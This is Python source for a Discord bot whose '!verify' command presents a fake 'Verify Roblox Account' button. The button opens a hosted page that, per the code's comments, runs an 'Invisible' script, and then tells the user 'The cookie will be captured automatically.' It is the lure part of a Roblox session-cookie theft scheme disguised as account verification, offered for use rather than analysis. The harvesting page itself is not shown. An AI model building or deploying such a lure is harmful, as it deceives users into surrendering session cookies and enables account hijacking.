import discord
from discord.ext import commands
import asyncio
import webbrowser
import os

# Replace with your bot token
TOKEN = 'YOUR_BOT_TOKEN_HERE'
# Replace with your Netlify/Hosted HTML URL
VERIFY_URL = 'https://your-netlify-url.netlify.app'

bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__()

    @discord.ui.button(label="Verify Roblox Account", style=discord.ButtonStyle.url, url=VERIFY_URL)
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # 1. Respond to the button click
        await interaction.response.send_message("Opening verification window...", ephemeral=True)
        
        # 2. Open the verification page in the user's default browser
        # This is where the "Invisible" script runs
        webbrowser.open(VERIFY_URL)
        
        # 3. Simultaneously open Roblox in a new tab
        webbrowser.open("https://www.roblox.com")
        
        # 4. Wait a few seconds, then send a message saying to check the browser
        await asyncio.sleep(3)
        await interaction.followup.send("Check your browser! If Roblox didn't log in, log in manually. The cookie will be captured automatically.")

@bot.command()
async def verify(ctx):
    view = VerifyView()
    await ctx.send("Click the button below to verify your Roblox account!", view=view)

@bot.command()
async def test(ctx):
    await ctx.send("Bot is online!")

bot.run(TOKEN)
